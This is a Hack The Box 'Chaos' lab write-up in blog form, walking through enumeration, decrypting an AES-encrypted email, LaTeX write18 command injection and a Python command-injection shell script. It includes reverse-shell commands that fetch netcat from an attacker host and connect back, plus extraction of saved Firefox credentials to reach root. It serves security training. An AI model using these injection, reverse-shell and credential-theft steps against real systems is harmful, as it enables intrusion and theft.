@@ -1,0 +1,814 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Chaos - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverse shell, we do some digging into the user’s folders and find the webmin root credentials stored in the Firefox user profile.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Chaos - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-chaos/">
+
+
+  <meta property="og:description" content="Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverse shell, we do some digging into the user’s folders and find the webmin root credentials stored in the Firefox user profile.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-chaos/chaos_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-05-25T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-chaos/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Chaos - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Chaos - Hack The Box">
+    <meta itemprop="description" content="Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverse shell, we do some digging into the user’s folders and find the webmin root credentials stored in the Firefox user profile.">
+    <meta itemprop="datePublished" content="May 25, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Chaos - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-05-25T00:00:00+02:00">May 25, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-chaos/chaos_logo.png" alt="" /></p>
+
+<p>Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverses shell, we do some digging into the user’s folders and find the webmin root credentials stored in the Firefox user profile.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>There’s a hidden wordpress blog with a password protected post</li>
+  <li>By enumerating the users with wpscan, we find a single user <code class="language-plaintext highlighter-rouge">human</code> which is also the password for the protected post</li>
+  <li>The post contains the credentials for a webmail account on webmail.chaos.htb site</li>
+  <li>The user mailbox has a message directing us to another hidden URI on the site which contains a PDF maker application</li>
+  <li>The application uses LaTeX and we can do command injection to get a reverse shell</li>
+  <li>From <code class="language-plaintext highlighter-rouge">www-data</code> we can <code class="language-plaintext highlighter-rouge">su</code> to user <code class="language-plaintext highlighter-rouge">ayush</code> with the credentials we got from the wordpress post</li>
+  <li>Searching the <code class="language-plaintext highlighter-rouge">ayush</code> home directory, we find a <code class="language-plaintext highlighter-rouge">.mozilla</code> directory which has saved <code class="language-plaintext highlighter-rouge">root</code> credentials for the Webmin application</li>
+</ul>
+
+<h2 id="blog--tools-used">Blog / Tools used</h2>
+
+<ul>
+  <li><a href="https://wpscan.org/">wpscan</a></li>
+  <li><a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a></li>
+  <li><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></li>
+</ul>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Services running:</p>
+<ul>
+  <li>HTTP server</li>
+  <li>IMAP &amp; POP3</li>
+  <li>Webmin (not vulnerable to any CVE as far as I could see)</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.120
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 17:38 EST
+Nmap scan report for 10.10.10.120
+Host is up (0.029s latency).
+Not shown: 65529 closed ports
+PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL AUTH-RESP-CODE STLS TOP PIPELINING RESP-CODES CAPA UIDL
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: Pre-login more SASL-IR capabilities LITERAL+ STARTTLS have LOGIN-REFERRALS post-login listed OK ENABLE LOGINDISABLEDA0001 ID IDLE IMAP4rev1
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: Pre-login SASL-IR capabilities LITERAL+ AUTH=PLAINA0001 more LOGIN-REFERRALS have post-login listed ENABLE OK ID IDLE IMAP4rev1
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER TOP PIPELINING RESP-CODES CAPA UIDL
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="enumeration-of-the-different-pages">Enumeration of the different pages</h3>
+
+<p>There’s a couple of different web pages:</p>
+
+<ol>
+  <li>If an FQDN is not used, we get a page with <code class="language-plaintext highlighter-rouge">Direct IP not allowed</code> error message:</li>
+</ol>
+
+<p><img src="/assets/images/htb-writeup-chaos/directip.png" alt="" /></p>
+
+<ol>
+  <li>The main <strong>chaos.htb</strong> page is just a generic corporate webpage with nothing else interesting on it:</li>
+</ol>
+
+<p><img src="/assets/images/htb-writeup-chaos/webpage.png" alt="" /></p>
+
+<ol>
+  <li>The page on port 10000 contains a link to HTTPS for the Webmin app</li>
+</ol>
+
+<p><img src="/assets/images/htb-writeup-chaos/port10000.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-chaos/webmin.png" alt="" /></p>
+
+<p>Observations:</p>
+<ul>
+  <li>Nothing interesting on the main page (just a static page)</li>
+  <li>We can’t log in to the Webmin application (tried guessing credentials, checking CVEs)</li>
+</ul>
+
+<h3 id="dirbusting-the-website">Dirbusting the website</h3>
+
+<p>Next, let’s dirbust the site to find hidden files &amp; folders:</p>
+
+<p>Checking <strong>10.10.10.120</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://10.10.10.120
+/javascript (Status: 301)
+/wp (Status: 301)
+</code></pre></div></div>
+
+<p>Checking <strong>chaos.htb</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://chaos.htb
+/css (Status: 301)
+/img (Status: 301)
+/javascript (Status: 301)
+/js (Status: 301)
+/source (Status: 301)
+</code></pre></div></div>
+
+<p>Let’s check out that Wordpress site.</p>
+
+<h3 id="wordpress">Wordpress</h3>
+
+<p>The site has a single post protected by a password:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/wordpress.png" alt="" /></p>
+
+<p>Next, let’s use wpscan to check for any WP vulnerabilities. There doesn’t seem to be any obvious non-authenticated vulnerability based on wpscan’s output, but we find a single user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># wpscan -u http://10.10.10.120/wp/wordpress
+...
+[!] Detected 1 user from RSS feed:
++-------+
+| Name  |
++-------+
+| human |
++-------+
+</code></pre></div></div>
+
+<p>If we try <code class="language-plaintext highlighter-rouge">human</code> as the password for the protected post we get:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/credentials.png" alt="" /></p>
+
+<p>So we got the following credentials:</p>
+<ul>
+  <li>user: <code class="language-plaintext highlighter-rouge">ayush</code></li>
+  <li>pass: <code class="language-plaintext highlighter-rouge">jiujitsu</code></li>
+</ul>
+
+<h3 id="access-to-webmail">Access to webmail</h3>
+
+<p>The note we found refers to <strong>webmail</strong>, so if we modify our local host file and add <code class="language-plaintext highlighter-rouge">webmail.chaos.htb</code> we get to the following page:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/webmail.png" alt="" /></p>
+
+<p>There’s a message in the Drafts folder containing an encrypted message:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/email.png" alt="" /></p>
+
+<p>We’re provided with the source code of the encryption app, which is basically just using AES in CBC mode and using the <code class="language-plaintext highlighter-rouge">sahay</code> name as the password (as the email says). The filesize and IV are stored at the beginning of the output file. We have all the pieces to decrypt the file, we just need to write a quick script to do that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto</span> <span class="kn">import</span> <span class="n">Random</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
+
+<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+    <span class="n">hasher</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">hasher</span><span class="p">.</span><span class="n">digest</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'enim_msg.txt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">filesize</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"filesize: %d"</span> <span class="o">%</span> <span class="n">filesize</span><span class="p">)</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"IV: %s"</span> <span class="o">%</span> <span class="n">iv</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">getKey</span><span class="p">(</span><span class="s">"sahay"</span><span class="p">)</span>
+<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span> <span class="p">)</span>
+<span class="k">print</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="mi">32</span><span class="p">:])</span>
+</code></pre></div></div>
+
+<p>The decrypted message is:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hii Sahay
+
+Please check our new service which create pdf
+
+p.s - As you told me to encrypt important msg, i did :)
+
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+</code></pre></div></div>
+
+<h3 id="pdf-maker-app">PDF maker app</h3>
+
+<p>The hidden directory contains a web application that generates PDF files.</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/pdfmaker.png" alt="" /></p>
+
+<p>The page uses javascript to do an Ajax call to the backend <code class="language-plaintext highlighter-rouge">ajax.php</code> file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">senddata</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#content</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+	<span class="kd">var</span> <span class="nx">template</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#template</span><span class="dl">"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="nx">content</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">No input given!</span><span class="dl">"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+		<span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ajax.php</span><span class="dl">"</span><span class="p">,</span>
+		<span class="na">data</span><span class="p">:</span> <span class="p">{</span>
+			<span class="dl">'</span><span class="s1">content</span><span class="dl">'</span><span class="p">:</span><span class="nx">content</span><span class="p">,</span>
+			<span class="dl">'</span><span class="s1">template</span><span class="dl">'</span><span class="p">:</span><span class="nx">template</span>
+		<span class="p">},</span>
+		<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">post</span><span class="dl">'</span>
+	<span class="p">}).</span><span class="nx">success</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+	<span class="p">}).</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#output</span><span class="dl">"</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">OOps, something went wrong...</span><span class="se">\n</span><span class="dl">"</span><span class="o">+</span><span class="nx">data</span><span class="p">)</span>
+	<span class="p">})</span>
+	<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-chaos/latex_post.png" alt="" /></p>
+
+<p>The results of the POST request looks like this:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/latex_output.png" alt="" /></p>
+
+<p>So the backend uses LaTeX to convert the data into a PDF. After doing some googling I found a <a href="https://0day.work/hacking-with-latex/">nice blog post</a> about ways to execute arbitrary command using LaTeX.</p>
+
+<p>There’s a few commands that are blacklisted, like:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">\input{/etc/passwd}</code></li>
+  <li><code class="language-plaintext highlighter-rouge">\include{password}</code></li>
+</ul>
+
+<p><img src="/assets/images/htb-writeup-chaos/blacklisted.png" alt="" /></p>
+
+<p>However the <code class="language-plaintext highlighter-rouge">\immediate\write18{whoami}</code> command is allowed. The output contains extra stuff but we can see that the <code class="language-plaintext highlighter-rouge">whoami</code> command was executed:</p>
+
+<p><img src="/assets/images/htb-writeup-chaos/rce.png" alt="" /></p>
+
+<p>I wrote a quick python script that sends the commands using the method above and also cleans up the output with some regex:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="p">,</span>
+	<span class="s">'X-Requested-With'</span><span class="p">:</span> <span class="s">'XMLHttpRequest'</span><span class="p">,</span>
+	<span class="s">'Cookie'</span><span class="p">:</span> <span class="s">'redirect=1'</span>
+<span class="p">}</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="bp">True</span><span class="p">):</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
+
+	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">'content'</span><span class="p">:</span> <span class="s">'</span><span class="se">\\</span><span class="s">immediate</span><span class="se">\\</span><span class="s">write18{%s}'</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">,</span>
+		<span class="s">'template'</span><span class="p">:</span> <span class="s">'test1'</span>
+	<span class="p">}</span>
+
+	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+	<span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'.*\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd\)</span><span class="se">\n</span><span class="s">\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd\)(.*)\[1'</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">MULTILINE</span><span class="o">|</span><span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        
+</code></pre></div></div>
+
+<p>The output of the script looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python crapshell.py 
+&gt; whoami
+www-data
+ 
+&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ 
+&gt; ls -l /home
+total 8
+drwx------ 6 ayush ayush 4096 Dec 16 03:32 ayush
+drwx------ 5 sahay sahay 4096 Nov 24 23:53 sahay
+</code></pre></div></div>
+
+<p>We still want to get a proper shell so what I did was download <code class="language-plaintext highlighter-rouge">nc</code> to the box and then spawn a reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wget -O /tmp/nc 10.10.14.23/nc
+ 
+&gt; chmod +x /tmp/nc
+ 
+&gt; /tmp/nc -e /bin/bash 10.10.14.23 4444
+
+[...]
+
+# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.120] 52378
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
+</code></pre></div></div>
+
+<p>There’s not much we can do with <code class="language-plaintext highlighter-rouge">www-data</code> except look at the web app source code and get the MySQL password for the Wordpress and Roundcube install. But we already have the <code class="language-plaintext highlighter-rouge">ayush</code> credentials so we can <code class="language-plaintext highlighter-rouge">su</code> to this user and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su -l ayush
+Password: jiujitsu
+
+ayush@chaos:~$ cat user.txt
+Command 'cat' is available in '/bin/cat'
+The command could not be located because '/bin' is not included in the PATH environment variable.
+cat: command not found
+ayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+&lt;l/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ayush@chaos:~$ cat user.txt
+eef391...
+</code></pre></div></div>
+
+<h3 id="privesc-through-firefox-credentials">Privesc through Firefox credentials</h3>
+
+<p>Remember that webmin page? By default, the <code class="language-plaintext highlighter-rouge">root</code> user credentials are used to log in to the application. When we look at <code class="language-plaintext highlighter-rouge">ayush</code> home directory, we see there’s a <code class="language-plaintext highlighter-rouge">.mozilla</code> folder in there with some encrypted Firefox credentials in <code class="language-plaintext highlighter-rouge">logins.json</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ cat logins.json
+cat logins.json
+{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">formSubmitURL</code> value is <code class="language-plaintext highlighter-rouge">https://chaos.htb:10000</code> so this means the user logged on to the Webmin application and saved the credentials.</p>
+
+<p>To decrypt those, we’ll first tar the whole .mozilla directory and <code class="language-plaintext highlighter-rouge">nc</code> it to our Kali box, then use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a>. The password is the same as the ayush password: <code class="language-plaintext highlighter-rouge">jiujitsu</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ./firefox_decrypt.py /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/
+2018-12-15 21:02:22,369 - WARNING - profile.ini not found in /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/
+2018-12-15 21:02:22,370 - WARNING - Continuing and assuming '/root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/' is a profile location
+
+Master Password for profile /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/: 
+
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+</code></pre></div></div>
+
+<p>Nice, we can just <code class="language-plaintext highlighter-rouge">su</code> to root and get the last flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ayush@chaos:~$ su -l root
+su -l root
+Password: Thiv8wrej~
+
+root@chaos:~# cat /root/root.txt
+cat /root/root.txt
+4eca7e...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#firefox" class="page__taxonomy-item" rel="tag">firefox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#latex" class="page__taxonomy-item" rel="tag">LaTeX</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pdf" class="page__taxonomy-item" rel="tag">pdf</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#saved-credentials" class="page__taxonomy-item" rel="tag">saved credentials</a><span class="sep">, </span>
+    
+      
+      
